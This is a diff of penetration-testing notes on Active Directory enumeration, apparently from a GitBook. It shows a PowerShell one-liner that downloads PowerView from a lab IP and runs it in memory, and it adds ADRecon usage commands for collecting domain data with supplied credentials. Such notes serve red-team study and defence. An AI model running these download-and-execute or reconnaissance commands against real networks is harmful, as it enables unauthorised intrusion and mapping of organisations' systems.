@@ -77,7 +77,7 @@ iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1
 powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
 ```
 
-#### PowerView Cheat Sheet:
+#### PowerView Cheat Sheet
 
 ![](../../.gitbook/assets/image%20%28171%29.png)
 
@@ -88,8 +88,26 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 ### [ADRecon](https://github.com/sense-of-security/ADRecon)
 
 ```text
-.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
+git clone https://github.com/sense-of-security/ADRecon.git
+
+#  run ADRecon on a domain member host
+.\ADRecon.ps1
+
+# run ADRecon on a domain member host as a different user.
+.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
+
+# run ADRecon on a non-member host using LDAP
+.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>
+
+# run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
+.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
+
+# generate the ADRecon-Report.xlsx based on ADRecon output (CSV Files).
+.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
+
 ```
+
+#### When you run ADRecon, a `ADRecon-Report-<timestamp>` folder will be created which will contain ADRecon-Report.xlsx and CSV-Folder with the raw files.
 
 
 
